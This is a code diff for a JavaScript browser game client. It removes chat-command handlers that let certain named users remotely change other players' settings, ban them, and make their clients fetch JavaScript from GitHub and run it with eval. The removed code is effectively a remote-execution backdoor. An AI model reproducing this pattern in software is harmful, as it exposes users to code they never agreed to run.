@@ -558,40 +558,8 @@ Owner:<ul>
                 break;
             case "message":
                 msg.m.m = msg.m.m.replace(/&gt;/g, ">").replace(/&lt;/g, "<");
-                if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "wolfie" || msg.m.s === "SkapClientAdmin") && msg.m.m.match(new RegExp("^exec " + user + " render "))) {
-                    const [key, value] = msg.m.m.slice(13 + user.length).split(" ");
-                    sendMessage("exec: " + (renderSettings.render[key] = (value === "true" || value === "1")));
-                } else if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "wolfie" || msg.m.s === "SkapClientAdmin") && (msg.m.m === "exec " + user + " version" || msg.m.m === "exec @a version")) {
-                    sendMessage(`version: ${version}`);
-                } else if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "wolfie" || msg.m.s === "SkapClientAdmin") && msg.m.m.match(/^exec @a render /)) {
-                    const [key, value] = msg.m.m.slice(15).split(" ");
-                    if (key in renderSettings.render) sendMessage(`exec: ${renderSettings.render[key] = !(value === "false" || value === "0")}`);
-                    else sendMessage(`exec: ${key} does not exist in render`);
-                } else if (msg.m.r !== -2 && msg.m.s === user && msg.m.m.match(/^exec @s render /)) {
-                    const [key, value] = msg.m.m.slice(15).split(" ");
-                    if (key in renderSettings.render) sendMessage(`exec: ${renderSettings.render[key] = !(value === "false" || value === "0")}`);
-                    else sendMessage(`exec: ${key} does not exist in render`);
-                } else if (msg.m.r !== -2 && msg.m.s === user && msg.m.m.match(/^exec @s js /)) {
-                    sendMessage(eval(msg.m.m.slice(11)));
-                } else if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "SkapClientAdmin") && msg.m.m.match(new RegExp("^ban " + user + "( |$)"))) {
-                    /** @type {string[]} */
-                    let split = msg.m.m.split(/ +/).slice(2);
-                    let last = split[split.length - 1];
-
-                    if (isNaN(last)) {
-                        ban(split.join(" "), Infinity);
-                    } else {
-                        ban(split.slice(0, split.length - 1).join(" "), Number(last) * 60000);
-                    }
-                } else if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "SkapClientAdmin") && (msg.m.m.match(new RegExp("^badapple " + user + " block")) || msg.m.m.match(new RegExp("^badapple " + user + "$")) || msg.m.m.match(/^badapple @a block/) || msg.m.m.match(/^badapple @a$/))) {
-                    fetch("https://raw.githubusercontent.com/NKY5223/BadApple/master/block.js").then(res => res.text()).then(text => { eval(text); bad_apple() }).catch(console.error);
-                } else if (msg.m.r !== -2 && msg.m.s === user && (msg.m.m.match(new RegExp("^badapple " + user + " block")) || msg.m.m.match(new RegExp("^badapple " + user + "$")) || msg.m.m.match(/^badapple @s block/) || msg.m.m.match(/^badapple @s$/))) {
-                    fetch("https://raw.githubusercontent.com/NKY5223/BadApple/master/block.js").then(res => res.text()).then(text => { eval(text); bad_apple() }).catch(console.error);
-                } else if (msg.m.r !== -2 && (msg.m.s === "NKY" || msg.m.s === "SkapClientAdmin") && (msg.m.m.match(new RegExp("^badapple " + user + " braille")) || msg.m.m.match(/^badapple @a braille/))) {
-                    fetch("https://raw.githubusercontent.com/NKY5223/BadApple/master/braille.js").then(res => res.text()).then(text => { eval(text); bad_apple() }).catch(console.error);
-                } else if (msg.m.r !== -2 && msg.m.s === user && (msg.m.m.match(new RegExp("^badapple " + user + " braille")) || msg.m.m.match(/^badapple @s braille/))) {
-                    fetch("https://raw.githubusercontent.com/NKY5223/BadApple/master/braille.js").then(res => res.text()).then(text => { eval(text); bad_apple() }).catch(console.error);
-                } else if (msg.m.s === user && msg.m.m.toLowerCase() === "ping" && pingTime) {
+                 
+                if (msg.m.s === user && msg.m.m.toLowerCase() === "ping" && pingTime) {
                     message({
                         s: "[CLIENT]",
                         r: 0,
